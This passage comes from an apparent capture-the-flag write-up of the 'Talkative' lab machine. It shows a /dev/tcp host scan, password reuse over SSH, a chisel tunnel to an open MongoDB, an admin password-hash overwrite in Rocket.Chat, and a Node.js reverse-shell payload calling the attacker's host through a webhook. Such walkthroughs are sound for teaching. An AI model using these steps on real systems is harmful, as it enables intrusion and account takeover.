<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq <span class="number">1</span> <span class="number">20</span>)</span><br><span class="line">do </span><br><span class="line">    host=<span class="number">172.18</span><span class="number">.0</span>.$i</span><br><span class="line">    echo <span class="string">&quot;Scanning $host&quot;</span>;(echo &gt;/dev/tcp/$host/<span class="number">22</span>) &amp;&gt;/dev/null &amp;&amp; echo <span class="string">&quot;$host is up (port 22 open)&quot;</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@46c004bb2269:/tmp$ bash test.sh</span><br><span class="line">bash test.sh</span><br><span class="line">Scanning <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">port <span class="number">22</span> <span class="keyword">is</span> <span class="built_in">open</span></span><br><span class="line">Scanning <span class="number">172.18</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">test.sh: connect: Connection timed out</span><br><span class="line">test.sh: line <span class="number">1</span>: /dev/tcp/<span class="number">172.18</span><span class="number">.0</span><span class="number">.2</span>/<span class="number">22</span>: Connection timed out</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>Bingo, let‚Äôs try to see if any users from the Bolt <code>xdata.json</code> file re-use his password. We got lucky,  <code>saul</code> do:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ pwncat-cs -lp <span class="number">8585</span></span><br><span class="line">[<span class="number">16</span>:05:02] Welcome to pwncat üêà!        </span><br><span class="line">[<span class="number">16</span>:05:03] received connection <span class="keyword">from</span> <span class="number">10.129</span><span class="number">.122</span><span class="number">.121</span>:<span class="number">39802</span>       </span><br><span class="line">(remote) www-data@46c004bb2269:/var/www/talkative.htb/bolt/public$ ssh saul@<span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;172.18.0.1 (172.18.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">saul@172.18.0.1&#x27;</span>s password:</span><br><span class="line">Welcome to Ubuntu <span class="number">20.04</span><span class="number">.4</span> LTS (GNU/Linux <span class="number">5.4</span><span class="number">.0</span>-<span class="number">81</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line">saul@talkative:~$ cat user.txt</span><br><span class="line">f7xxxxxxxxxxxxxxxx087</span><br></pre></td></tr></table></figure>

<h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Usual recon doesn‚Äôt yield any interesting files or mis-configuration that could easily trigger privilege escalation. However while monitoring <code>pspy</code> I noticed a script referring <code>mongo</code> running as <code>root</code>. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:~$ ./tmp/pspy64</span><br><span class="line">[...]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">24</span> <span class="number">16</span>:<span class="number">21</span>:01 CMD: UID=<span class="number">0</span>    PID=<span class="number">50639</span>  | python3 /root/.backup/update_mongo.py</span><br></pre></td></tr></table></figure>

<p>It‚Äôs surprising because MongoDB usually run on port <code>27017</code> which doesn‚Äôt appears in <code>netstat</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:/tmp$ netstat -tulpn | grep LISTEN</span><br><span class="line">(Not <span class="built_in">all</span> processes could be identified, non-owned process info</span><br><span class="line"> will <span class="keyword">not</span> be shown, you would have to be root to see it <span class="built_in">all</span>.)</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6007</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6008</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span>          <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6009</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6010</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6011</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6012</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6013</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6014</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6015</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6000</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6001</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8081</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6002</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8082</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6003</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6004</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6005</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.53</span>:<span class="number">53</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6006</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">22</span>              <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      -</span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">8080</span>                 :::*                    LISTEN      -</span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">8081</span>                 :::*                    LISTEN      -</span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">8082</span>                 :::*                    LISTEN      -</span><br></pre></td></tr></table></figure>

<p>This probably means that the MongoDB instance is running on another docker container. Let‚Äôs dig a bit on this path to see if we can retrieve sensitive informations from the database.</p>
<h3 id="Pivot-saul-‚Üí-Rocket-chat"><a href="#Pivot-saul-‚Üí-Rocket-chat" class="headerlink" title="Pivot saul ‚Üí Rocket.chat"></a>Pivot saul ‚Üí Rocket.chat</h3><p>First let‚Äôs re-use our script to find in which host <code>mongo</code> is running:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq <span class="number">1</span> <span class="number">20</span>)</span><br><span class="line">do </span><br><span class="line">    host=<span class="number">172.18</span><span class="number">.0</span>.$i</span><br><span class="line">    echo <span class="string">&quot;Scanning $host&quot;</span>;(echo &gt;/dev/tcp/$host/<span class="number">27017</span>) &amp;&gt;/dev/null &amp;&amp; echo <span class="string">&quot;$host is up (port 27017 open)&quot;</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>We find the MongoDB instance running on host <code>172.17.0.2:27017</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:/tmp$ bash host_discovery.sh</span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> <span class="keyword">is</span> up (port <span class="number">27017</span> <span class="built_in">open</span>)</span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line">Scanning <span class="number">172.17</span><span class="number">.0</span><span class="number">.5</span></span><br></pre></td></tr></table></figure>

<p>Since we don‚Äôt have SSH access, Let‚Äôs use <a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">chisel</a> to forward the <code>mongobd</code> port to our <a target="_blank" rel="noopener" href="http://localhost/">localhost</a> in order to see what is in the database:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:/tmp$ wget <span class="number">10.10</span><span class="number">.14</span><span class="number">.19</span>:<span class="number">8000</span>/chisel &amp;&amp; chmod +x chisel</span><br><span class="line">Saving to: ‚Äòchisel‚Äô</span><br></pre></td></tr></table></figure>

<p>Let‚Äôs open the listener on our machine:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ chisel server -p <span class="number">8585</span> --reverse</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">24</span> <span class="number">16</span>:<span class="number">44</span>:<span class="number">42</span> server: Reverse tunnelling enabled</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">24</span> <span class="number">16</span>:<span class="number">44</span>:<span class="number">42</span> server: Fingerprint 5lXTHz9HmTtx2xUn5Q7wRLCZFERrnSLX/XWGVoYNjwM=</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">24</span> <span class="number">16</span>:<span class="number">44</span>:<span class="number">42</span> server: Listening on http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8585</span></span><br></pre></td></tr></table></figure>

<p>And the client pointing to port <code>27017</code> on talkative host:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:/tmp$ ./chisel client <span class="number">10.10</span><span class="number">.14</span><span class="number">.19</span>:<span class="number">8585</span> R:<span class="number">27017</span>:<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">27017</span></span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">13</span>:04:<span class="number">00</span> client: Connecting to ws://<span class="number">10.10</span><span class="number">.14</span><span class="number">.19</span>:<span class="number">8585</span></span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">13</span>:04:01 client: Connected (Latency <span class="number">33.130311</span>ms)</span><br></pre></td></tr></table></figure>

<p>Once connected we can using <code>mongosh</code> (MongoDB Shell) to read the database content. Good news is, the database doesn‚Äôt require authentication: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ mongosh <span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span></span><br><span class="line">Current Mongosh Log ID:	62669d8d54003c56213b04cc</span><br><span class="line">Connecting to:		mongodb://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">27017</span>/?directConnection=true&amp;serverSelectionTimeoutMS=<span class="number">2000</span>&amp;appName=mongosh+<span class="number">1.3</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">rs0 [direct: primary] test&gt; show databases</span><br><span class="line">admin    <span class="number">106</span> kB</span><br><span class="line">config   <span class="number">127</span> kB</span><br><span class="line">local   <span class="number">11.8</span> MB</span><br><span class="line">meteor  <span class="number">4.89</span> MB</span><br><span class="line">rs0 [direct: primary] config&gt; use meteor</span><br><span class="line">switched to db meteor</span><br><span class="line">rs0 [direct: primary] meteor&gt; show tables</span><br><span class="line">[...]</span><br><span class="line">users</span><br><span class="line">usersSessions</span><br><span class="line">rs0 [direct: primary] meteor&gt; db.users.find()</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: <span class="string">&#x27;rocket.cat&#x27;</span>,</span><br><span class="line">    createdAt: ISODate(<span class="string">&quot;2021-08-10T19:44:00.224Z&quot;</span>),</span><br><span class="line">    avatarOrigin: <span class="string">&#x27;local&#x27;</span>,</span><br><span class="line">    name: <span class="string">&#x27;Rocket.Cat&#x27;</span>,</span><br><span class="line">    username: <span class="string">&#x27;rocket.cat&#x27;</span>,</span><br><span class="line">    status: <span class="string">&#x27;online&#x27;</span>,</span><br><span class="line">    statusDefault: <span class="string">&#x27;online&#x27;</span>,</span><br><span class="line">    utcOffset: <span class="number">0</span>,</span><br><span class="line">    active: true,</span><br><span class="line">    <span class="built_in">type</span>: <span class="string">&#x27;bot&#x27;</span>,</span><br><span class="line">    _updatedAt: ISODate(<span class="string">&quot;2021-08-10T19:44:00.615Z&quot;</span>),</span><br><span class="line">    roles: [ <span class="string">&#x27;bot&#x27;</span> ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: <span class="string">&#x27;ZLMid6a4h5YEosPQi&#x27;</span>,</span><br><span class="line">    createdAt: ISODate(<span class="string">&quot;2021-08-10T19:49:48.673Z&quot;</span>),</span><br><span class="line">    services: &#123;</span><br><span class="line">      password: &#123;</span><br><span class="line">        bcrypt: <span class="string">&#x27;$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y&#x27;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      email: &#123;</span><br><span class="line">        verificationTokens: [</span><br><span class="line">          &#123;</span><br><span class="line">            token: <span class="string">&#x27;dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w&#x27;</span>,</span><br><span class="line">            address: <span class="string">&#x27;saul@talkative.htb&#x27;</span>,</span><br><span class="line">            when: ISODate(<span class="string">&quot;2021-08-10T19:49:48.738Z&quot;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      resume: &#123;</span><br><span class="line">        loginTokens: [</span><br><span class="line">          &#123;</span><br><span class="line">            when: ISODate(<span class="string">&quot;2022-03-15T17:06:53.808Z&quot;</span>),</span><br><span class="line">            hashedToken: <span class="string">&#x27;VMehhXEh1Z89e3nwMIq+2f5JIFid/7vo6Xb6bXh2Alc=&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    emails: [ &#123; address: <span class="string">&#x27;saul@talkative.htb&#x27;</span>, verified: false &#125; ],</span><br><span class="line">    <span class="built_in">type</span>: <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">    status: <span class="string">&#x27;offline&#x27;</span>,</span><br><span class="line">    active: true,</span><br><span class="line">    _updatedAt: ISODate(<span class="string">&quot;2022-04-04T17:12:30.788Z&quot;</span>),</span><br><span class="line">    roles: [ <span class="string">&#x27;admin&#x27;</span> ],</span><br><span class="line">    name: <span class="string">&#x27;Saul Goodman&#x27;</span>,</span><br><span class="line">    lastLogin: ISODate(<span class="string">&quot;2022-03-15T17:06:56.543Z&quot;</span>),</span><br><span class="line">    statusConnection: <span class="string">&#x27;offline&#x27;</span>,</span><br><span class="line">    username: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    utcOffset: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>We have access to the accounts information of the <a target="_blank" rel="noopener" href="http://rocket.chat/">Rocket.chat</a> application running on port 3000. </p>
<p>We are not going to try cracking the <code>bcrypt</code> hash, it would be no use since we have write access to the database. The <a target="_blank" rel="noopener" href="http://rocket.chat/">rocket.chat</a> <a target="_blank" rel="noopener" href="https://docs.rocket.chat/guides/administration/misc.-admin-guides/restoring-an-admin">documentation</a> explains how to reset an admin user password to <code>12345</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rs0 [direct: primary] meteor&gt; db.getCollection(<span class="string">&#x27;users&#x27;</span>).updateOne(&#123;username:<span class="string">&quot;admin&quot;</span>&#125;, &#123; $<span class="built_in">set</span>: &#123;<span class="string">&quot;services&quot;</span> : &#123; <span class="string">&quot;password&quot;</span> : &#123;<span class="string">&quot;bcrypt&quot;</span> : <span class="string">&quot;$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG&quot;</span> &#125; &#125; &#125; &#125;)</span><br><span class="line">&#123;</span><br><span class="line">  acknowledged: true,</span><br><span class="line">  insertedId: null,</span><br><span class="line">  matchedCount: <span class="number">1</span>,</span><br><span class="line">  modifiedCount: <span class="number">1</span>,</span><br><span class="line">  upsertedCount: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">rs0 [direct: primary] meteor&gt;</span><br></pre></td></tr></table></figure>

<p>We can now connect to the <a target="_blank" rel="noopener" href="http://rocket.chat/">Rocket.Chat</a> application as admin we can quickly gather more information (like version number):</p>
<p><img src="https://user-images.githubusercontent.com/9076747/165098988-b93a12a4-07a2-4c12-ba90-3ef8253db870.png" alt="https://user-images.githubusercontent.com/9076747/165098988-b93a12a4-07a2-4c12-ba90-3ef8253db870.png"></p>
<p>Searching for exploit on this version returns CVE-2021-22911: ‚Äú<a target="_blank" rel="noopener" href="https://github.com/CsEnox/CVE-2021-22911">Pre-Auth Blind NoSQL Injection leading to Remote Code Execution in Rocket Chat 3.12.1</a>‚Äù.</p>
<blockquote>
<p><strong>RCE ( Autenticated - Admin )</strong><br>Rocket.Chat has a feature called Integrations that allows creating incoming and outgoing web hooks. These web hooks can have scripts associated with them that are executed when the web hook is triggered.<br>We create a integration with a remote execution script.</p>
</blockquote>
<p>Let‚Äôs give it a try. </p>
<p>It‚Äôs a bit of struggle to open a reverse shell, <a target="_blank" rel="noopener" href="http://rocket.chat/">rocket.chat</a> is very probably also running in a docker container with no <code>nc</code>, <code>bash</code> nor <code>python</code> available.<br>After searching a bit we can find this <a target="_blank" rel="noopener" href="https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/">Node.js reverse shell</a> that should give better luck since it doesn‚Äôt require any external tools. Let‚Äôs build our payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const require = console.log.constructor(<span class="string">&#x27;return process.mainModule.require&#x27;</span>)();</span><br><span class="line">var net = require(<span class="string">&quot;net&quot;</span>), cp = require(<span class="string">&quot;child_process&quot;</span>), sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">var client = new net.Socket();</span><br><span class="line">client.connect(<span class="number">8544</span>, <span class="string">&quot;10.10.14.19&quot;</span>, function()&#123;</span><br><span class="line">  client.pipe(sh.stdin);</span><br><span class="line">  sh.stdout.pipe(client);</span><br><span class="line">  sh.stderr.pipe(client);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Then we create the Integration:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/165103605-a827aa1a-9d98-403b-8e80-40eee285fb92.png" alt="https://user-images.githubusercontent.com/9076747/165103605-a827aa1a-9d98-403b-8e80-40eee285fb92.png"></p>
<p>Once saved we can trigger the webhook to receive the connection on our reverse shell:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://talkative.htb:<span class="number">3000</span>/hooks/3FBhk4BCPEsMTxWeh/Sej9ohSu6mfE9pdQvbR97hHAfSWm7pxyWYZu8qvde3BRkazK</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ pwncat-cs -lp <span class="number">8544</span>                                                                           __main__.py:<span class="number">164</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">56</span>:<span class="number">00</span>] received connection <span class="keyword">from</span> <span class="number">10.129</span><span class="number">.227</span><span class="number">.113</span>:<span class="number">41104</span>                                                          bind.py:<span class="number">84</span></span><br><span class="line">(remote) root@c150397ccd63:/app/bundle/programs/server<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>Once again <code>pwncat-cs</code> comes useful to upload our enumeration script since <code>wget</code> nor <code>curl</code> is available on the box:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(local) pwncat$ upload ./tools/lp.sh /tmp/lp.sh</span><br><span class="line">[<span class="number">13</span>:<span class="number">59</span>:<span class="number">38</span>] uploaded <span class="number">776.17</span>KiB <span class="keyword">in</span> <span class="number">0.66</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Once again, our enumeration do not returns any useful information, but that‚Äôs expected when running in a docker container. Knowing that we exploited all the services running on this box it might be time to try a container escape vulnerability.<br>I decided to give a try to <code>cdk</code> which is an open-sourced container penetration toolkit.<br>Once run we get notified that the <code>CAP_DAC_READ_SEARCH</code> capability is set on the container:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(remote) root@c150397ccd63:/root<span class="comment"># ./cdk evaluate</span></span><br><span class="line"></span><br><span class="line">[Information Gathering - System Info]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> current <span class="built_in">dir</span>: /root</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> current user: root uid: <span class="number">0</span> gid: <span class="number">0</span> home: /root</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> hostname: c150397ccd63</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> debian debian <span class="number">10.10</span> kernel: <span class="number">5.4</span><span class="number">.0</span>-<span class="number">81</span>-generic</span><br><span class="line"></span><br><span class="line">[Information Gathering - Services]</span><br><span class="line"><span class="number">2022</span>/04/<span 